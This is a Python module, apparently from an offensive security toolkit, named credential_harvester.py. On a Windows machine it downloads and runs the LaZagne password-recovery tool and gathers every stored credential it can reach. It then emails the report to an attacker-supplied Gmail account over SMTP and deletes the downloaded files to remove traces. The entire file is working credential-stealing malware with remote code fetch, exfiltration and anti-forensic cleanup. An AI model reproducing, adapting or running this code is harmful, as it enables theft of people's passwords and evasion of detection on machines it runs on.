'''
module: credential_harvester.py
description: get user credentials on Windows machine
platform: Windows
'''
import os
import tempfile
import subprocess
import zipfile
from pyhtools.evil_files.malwares.utils import send_mail, download
from shutil import rmtree


class CredentialHarvester:
    @staticmethod
    def run(email: str, password: str, lazagne_download_link: str = r'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.2/Windows.zip', smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587):
        '''
        generates data report and sends email to self
        '''
        # change workding directory to tmp directory
        tmp_dir = tempfile.gettempdir()
        os.chdir(tmp_dir)

        # get file and extracted directory names
        file_name = lazagne_download_link.split('/')[-1]  # Windows.zip
        extract_dir = file_name.split('.')[0]  # Windows

        # download and unzip lazagne
        download(lazagne_download_link)
        with zipfile.ZipFile(file_name, 'r') as zip_file:
            zip_file.extractall(tmp_dir)

        # change to extracted directory (Windows)
        os.chdir(extract_dir)

        # generate reports
        recovered_report = subprocess.call('laZagne_x86.exe all')
        report = subprocess.check_output('lazagne.exe all -vv')
        msg = f'Subject: Credential Harvester Report.\n\n{"-"*25}\n{report}\n{"-"*25}\n{recovered_report}'

        # mail reports
        send_mail(
            email=email,
            receiver_mail=email,
            password=password,
            message=msg,
            smtp_server=smtp_server,
            smtp_port=smtp_port,
        )

        # remove traces
        os.chdir('..')
        rmtree(extract_dir)
        os.remove(file_name)


if __name__ == '__main__':
    CredentialHarvester.run('your_gmail', 'your_gmail_passwd')
